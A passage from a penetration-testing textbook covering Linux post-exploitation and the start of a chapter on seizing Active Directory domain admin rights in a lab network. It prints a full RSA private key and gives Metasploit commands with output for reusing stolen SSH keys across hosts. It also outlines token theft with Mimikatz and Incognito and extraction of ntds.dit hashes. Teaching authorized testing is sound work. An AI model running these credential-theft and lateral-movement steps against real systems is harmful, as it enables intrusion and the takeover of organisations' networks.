CME to do a Pass-the-Hash style attack on the remaining systems in your scope.
Instead of passing password hashes, however, you pass SSH private keys. 
 In rare cases, this can lead to root on another machine where the user whose SSH
key you obtained from a level-one host, allowed access to a level-two system; and on
that system, the same user had root privileges. For this outcome alone, it’s worthwhile
to spend time during post-exploitation gathering as many SSH keys as you can find
and passing them around to the other Linux or UNIX hosts on your network. Again,
when I say “pass them around,” I mean attempt to authenticate to other systems.
TIP
In chapter 4, you should have created protocol-specific target lists based
on what ports and services were identified during service discovery. I typically
put all IP addresses that had SSH identified in a file called ssh.txt. This the file
to which you should pass all your SSH keys when searching for access to level-
two Linux or UNIX systems.
Listing 9.14
Backdooring the /etc/passwd file
Copy passwd1 over to /etc/passwd, 
overwriting the system file.
Switch to the pentest user 
account, typing P3nt3st! 
at the prompt.
You now have 
unrestricted root access 
to the entire system.
172
CHAPTER 9
Linux or UNIX post-exploitation
SSH keys belonging to the user account on which you are accessing your compro-
mised system should be located in the ~/.ssh directory because that is where they are
stored by default. That being said, don’t underestimate users’ appetite for peculiar
behavior and choosing to store them somewhere else. More often than not, a simple
ls -l ~/.ssh will tell you if the user has any SSH keys. Grab a copy of any you find,
and store them on your attacking machine. 
9.4.1
Stealing keys from a compromised host
The output in listing 9.15 shows the contents of the ~/.ssh directory for the root user
account on one of the Linux systems in the Capsulecorp Pentest network. There is
one pair of SSH keys in the directory. The pentestkey file is the private key, and the
pentestkey.pub file is the public key. The private key is the file you need to pass to
additional systems to see if you can access them.
~$ ls -l ~/.ssh
total 12
-rw------- 1 root root    0 Feb 26  2019 authorized_keys
-rw-r--r-- 1 root root  222 Jan 24 18:36 known_hosts
-rw------- 1 root root 1679 Jan 24 18:25 pentestkey   
-rw-r--r-- 1 root root  394 Jan 24 18:25 pentestkey.pub    
Don’t worry if you’re unsure about which file is the public key and which is the private
key. For example, the user may have renamed the files so there is no .pub extension
on the public key. You can use the file pentestkey command to check which is
which. As you can see from the following output, file knowns the different between
the two:
pentestkey: PEM RSA private key
pentestkey.pub: OpenSSH RSA public key
NOTE
SSH keys that are password-protected are obviously no good to you
unless you know the password. The good news is that users are typically lazy
and frequently create keys without a password. 
Just as with Pass-the-Hash, you have several options for passing SSH keys. The concept
is the same no matter the tool, so we’ll stick with an industry favorite and use
Metasploit. In the next section, I demonstrate using Metasploit to pass an SSH key dis-
covered on one of the machines in the Capsulecorp Pentest network.
9.4.2
Scanning multiple targets with Metasploit
First you need to store the private key that you want to try to authenticate with on your
attacking machine. Because you are most likely using a terminal, believe it or not, the
most straightforward way to do this is to use the cat command to list the contents of
the file and then copy and paste it into a new file on your system. If you’ve never seen
Listing 9.15
Contents of a user’s ~/.ssh directory
SSH private key
SSH public key
173
Passing around SSH keys
the contents of an SSH key, have a look at the following listing, which shows the
pentestkey private key created earlier in this chapter.
~$ cat ~/.ssh/pentestkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAtEb7Lys39rwW3J+Ow3eZ1F/y1XVqynjKvNvfmQuj7HaPJJlI
y+50HIgKL1o44j5U7eLq1SNwis6A1+wx7+49ppMCSqRMDBq7wwqwVRjFgkyAo9cj
q4RYQ3SpD2xcUSAyOoHlsTldj2QijbOuEaw7Q0Ek3oW83TnB2ea1jrXofRyTnFux
fEe/xZQ5ujkeR8z17zx0piSESjp1VBKYlIY2mu5stf75dJ1PjPrrqATTnJlaUR0H
9p1HCFLY8PfAvkhxpGoFQUNsVDS7wzfN5TUvHL6bWjo47QohkG6H9yxqXXMm68n/
+0iO7sISUH7oOXJhM5Yv8sxeuidGAqOrtfAs6wIDAQABAoIBAQCBcLXKGG4Gaua/
YpFPKAD7zCi/u58B4dkv4W+apBD/J+F/lc//HSehlMw7U7ykNb0lUVjr0JZuE/fP
EXiJnbYGdGeg0HcJ+ef3EyWo9DBcbjGvcjnaXRxC0vDQci2W0lc+SyZxKY9T9cIZ
nHnPlqq2j3+5hq0k6uOVYWHbJiHYMgY9uifeNfsFVU0KO+U/stHpRyaQfCNm4bzs
b/EZNJLzL4VMtaL72V2S9BKZXOW3VfFek5iccqOdV7PJBPUkqxk2u5cQglrXwEHb
yJjMo3CT3Vi5JIXu/aBbVjymKR3R9K5fWzv6J14KjzxSfOF6dJrFFOzkSklhP1zk
ekl46IYBAoGBAO9S/3iwoaEAtTLyozzG5D+X+aQj0J+NqWMnYmNr38ad7NQRvi69
OvIO8mxNsZdiPWM9/LfDh3CQhZustXNniq9DZ+eOdEuKpedCVk43+9q06Lkr1Tdw
XMRF9p1D6q8G4AoKhJ66fs5j24sJTyQE67ZAsC7/op3E4dj+qGAERoGxAoGBAMDW
uDK+bgNJyZm26UXkAngJp4bTyY64L7vV69jXUa0jjceqoouZuL/14rCMHiSHVLFp
+GhPky67X9E9Vbkir9f0yPB0yBpKf6HHEcit2o13sGK2MziRSZ04agh9QeJceumW
nvmNizWFWCwLmPuGqeSFItZr8Vxx9Z2Q3mhmywNbAoGBANSESz+M+bnSuxTmyXWq
1/xwo8nR0+wbC5N04bWPkUL58dfPeaZfevx/sV3jEBRxtDlwTf2Qr7CRZVN75hT4
mPpRTO8eXL7H+9KD4cfLhuYLR61G8ysrp/TSe8/jA38xB7li5aldykTT/5xTQ+ek
RvusLcdOUcTvk+3xFOtOYJ3BAoGBAJNVenaKuFMa1UT0U1Zq1tgPyEdjGORKJW5G
C2QpXuYB/BlJbddrI5TGsORiqcUPAM5sQLax1aomzxZ23kANGHzPMZdGInyz3sAj
8Jp6+jiL8d/5hTj7CFtu9tR1nxjrv50oz12rn2jM8Ij2c3P5d2R5tBxPbKFNEHPK
c6MgpotxAoGBAK/90Qd8fqUDR2TqK8wnF5LIIZSGR8Gp88O3uoGNjIqAPBEcfJll
tT95aYV1XC3ANv5cUWw7Y3FqRmxsy/mYhKc9bQfXbBeF0dBc7ZpBI5C4vCFbeOX1
xQynrb5RAi4zsrT0kjxNBprdCiXLYVDsykBgYvBbhNNrH7oAp7Q7ZfxB
-----END RSA PRIVATE KEY-----
For my example, I’ll simply copy and paste this into a file on my attacking machine named
~/stolen_sshkey—that’s all I need, to fire up the Metasploit msfconsole and begin pass-
ing this SSH key to the various systems in the Capsulecorp Pentest scope to see if it gets
me in anywhere else. I’ll start by opening the msfconsole and loading the SSH Public Key
Login Scanner by issuing use auxiliary/scanner/ssh/ssh_login_pubkey. 
 If you’re wondering why it’s called the Public Key login module instead of the Pri-
vate Key login module, it’s because the process of using private/public keys to authen-
ticate has long been referred to as public key authentication or even PubkeyAuthentication,
as it’s written in the sshd config file on Linux/UNIX systems. Nevertheless, this is the
module you use to try to authenticate with an SSH private key against multiple sys-
tems. As you have now done many times throughout this book, set a target for this
module by typing set rhosts file:/path/to/your/ssh.txt, and run the module by
typing run. Specify a valid username and the path to your private key file; and for this
module, I recommend turning off verbose output, or it will be hard to decipher.
Here’s what a successful authentication looks like.
Listing 9.16
Contents of an SSH private key
174
CHAPTER 9
Linux or UNIX post-exploitation
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set KEY_PATH
➥ /home/royce/stolen_sshkey    
KEY_PATH => /home/royce/stolen_sshkey
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts 
file:/home/royce/capsulecorp/discovery/services/ssh.txt   
rhosts => file:/home/royce/capsulecorp/discovery/services/ssh.txt
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set username royce 
username => royce
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set verbose false
verbose => false
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > run
[*] 10.0.10.160:22 SSH - Testing Cleartext Keys
[+] 10.0.10.160:22 - Success: 'royce:-----BEGIN RSA PRIVATE KEY---------
[*] Command shell session 2 opened (10.0.10.160:35995 -> 10.0.10.160:22) at
2020-01-28 14:58:53 -0600   
[*] 10.0.10.204:22 SSH - Testing Cleartext Keys
[*] Scanned 11 of 12 hosts (91% complete)
[*] 10.0.10.209:22 SSH - Testing Cleartext Keys
[*] Scanned 12 of 12 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) >
One nice feature of the Metasploit module is that it automatically opens a reverse
shell to any targets that successfully authenticated with the username and private key
you provided. Of course, you could just SSH into any systems you find, but the added
convenience of having it done for you automatically is always nice. If for some reason
you don’t want Metasploit to behave this way, you can turn off the auto-session feature
by typing set CreateSession false before running the module.
Summary
 The three main components of post-exploitation have not changed; they are
Maintaining reliable re-entry, harvesting credentials, and moving laterally.
 Credentials can be discovered in configuration .dot files and directories as well
as in bash history logs.
 Tunneling a reverse shell through SSH is a great way to maintain reliable re-
entry into a compromised host.
 Cron jobs can be used to schedule a reverse shell callback automatically.
 Even if you don’t have root on a system, you can potentially discover SSH keys
that can be used to access other machines even as root.
Listing 9.17
Authenticating with the SSH Public Key Login Scanner module
File path of your SSH key
File path containing IP
addresses running SSH
Username 
to try 
along with 
the key
Turns off verbose output;
otherwise it is difficult to
sort through
Opens a command shell 
with each successful login
175
Controlling
 the entire network
It’s time to explain the final step in the post-exploitation and privilege-escalation phase
of an internal network penetration test (INTP). That, of course, is to take complete
control of the enterprise network by gaining domain admin privileges in Active Direc-
tory. Domain admin users can log in to any machine on the network, provided the
machine is managed through Active Directory. If an attacker manages to gain domain
admin privileges on an enterprise network, the outcome could be catastrophic for the
business. If it’s not clear why, think about the number of business-critical systems that
are managed and operated by computer systems joined to the domain:
This chapter covers
 Identifying domain admin users
 Locating systems with domain admin users 
logged in
 Enumerating domain controller volume shadow 
copies (VSS)
 Stealing ntds.dit from VSS 
 Extracting Active Directory password hashes from 
ntds.dit
176
CHAPTER 10
Controlling the entire network
 Payroll and accounting
 Human resources
 Shipping and receiving
 IT and networking
 Research and development
 Sales and marketing
You get the idea. Name a function in the business, and it is likely managed by people
who use computer systems that are joined to an Active Directory domain. Therefore,
as pentesters, we can conclude that our simulated cyber-attack can’t get much worse
than gaining domain admin privileges on our client’s network.
In this chapter, I cover two ways you can achieve domain admin-level privileges during
an INPT. Both scenarios rely on the fact that a domain admin user is probably logged
in to the network performing administration activities, because that’s their job. If
you’ve been diligent on your engagement up to this point, then you’ve first gained
access to level-one systems by taking advantage of direct access vulnerabilities and
attack vectors. Second, you’ve used information or credentials obtained from those
systems to pivot to level-two systems that are now accessible to you as well. 
 From here, it’s just a matter of identifying who the domain admin users are and then
locating a system where one of them is logged in. After we cover techniques for identi-
fying and locating domain admins, I’ll show you how to take advantage of their active
sessions and essentially impersonate them on the network, making you a domain admin
of your client’s domain. Finally, you’ll learn where to obtain the so-called “keys to the
kingdom”—the password hashes for every Active Directory account on the domain—
and how to get them in a non-destructive manner. Before going into the step-by-step
breakdown of this process, let’s first look at a high-level overview of what you’ll learn in
this chapter (see figure 10.1) for a breakdown of the five steps:
1
Identify the users belonging to the Domain Admins group. These user accounts
have full access to every domain-joined system in your target network environment.
2
Locate the system or systems that have a domain admin user account presently
logged in. 
Going beyond domain admin
It’s certainly possible to go further than obtaining domain admin privileges. It just
isn’t practical on a typical INPT. Once you have obtained domain admin, you can usu-
ally verbally tell your client, “We could have done XYZ,” where XYZ is moving money,
installing a key logger on executives’ workstations, or exfiltrating intellectual prop-
erty. That type of exercise is better suited for a more advanced adversarial simula-
tion, often referred to as a red team engagement.
177
3
Impersonate that user by using credentials or authentication tokens present on
the system at the time the domain admin user is logged in.
4
Obtain a copy of the ntds.dit file from the domain controller. This file contains
the password hashes for all user accounts in Active Directory.
5
Extract the password hashes from ntds.dit, granting you the ability to authenti-
cate to any domain system as any domain user.
Now that you know what the process looks like, let’s examine the first two steps in the
chain:
 Identifying the domain admin user accounts 
 Locating a system with one of them logged in
E
D
C
B
All the password
hashes
All the password
hashes
A
Attacking machine
Domain admin
logged in
Domain controller
Server 1
Server 2
Server 3
Server 4
Volume
shadow
copy
NTDS.dit
SYSTEM registry hive
lmpacket: secretsdump.py
Impersonate a domain admin
account
Mimikatz: Harvest credentials
Incognito: Steal tokens
$ net group "Domain Admins"/domain
Metasploit: psexec_command("qwinsta")
Domain admin
usernames
Domain admin
usernames
Domain admin
usernames
All the password
hashes
A. Identify domain admin user accounts.
B. Locate systems with domain admins logged in.
C. Elevate to domain admin privileges.
D. Obtain NTDS.dit and SYSTEM from VSC on
    domain controller.
E. Extract all domain account password hashes.
Figure 10.1
Controlling the entire Active Directory domain
178
CHAPTER 10
Controlling the entire network
10.1
Identifying domain admin user accounts
To identify domain admin user accounts, you only need to use a single command,
which comes native as part of the Windows OS. I’m talking about the net command,
which you can use to query the Domain Admins Active Directory user group.
 By now, you have been able to compromise a number of hosts in your target envi-
ronment, so for this chapter, I will assume you can easily gain access to a Windows
command prompt on one of your level-one or level-two systems. You’ll need to use
one of these hosts to execute the net command. 
10.1.1 Using net to query Active Directory groups
The syntax for the net command is about as straightforward as you can get. All you
need to know is the name of the Active Directory group you want to query: in this
case, Domain Admins. The group name should be placed inside quotes because it
includes a space, which the net command doesn’t know how to process. Finally, you
need to include the /domain argument, which says to process the request on the near-
est domain controller. Putting it all together, the command looks like this:
net group "Domain Admins" /domain 
The output in the next listing shows the domain admin users for the capsulecorp
.local domain. 
The request will be processed at a domain controller for domain
capsulecorp.local.    
Group name     Domain Admins
Comment        Designated administrators of the domain
Members
---------------------------------------------------------------------------
Administrator            gokuadm                  serveradmin.
The command completed successfully.
C:\Users\tien.CAPSULECORP>
In a modern enterprise network, you’re likely to see a dozen or even two or three
dozen domain admin users when you run this command. The more domain admin
users there are, the higher the likelihood you can find a system with one logged in. If
you’re a systems administrator reading this, keep that in mind, and try to limit the
number of domain admin accounts on your network to as few as possible.
Listing 10.1
Output of the net group command
Name of the Active 
Directory domain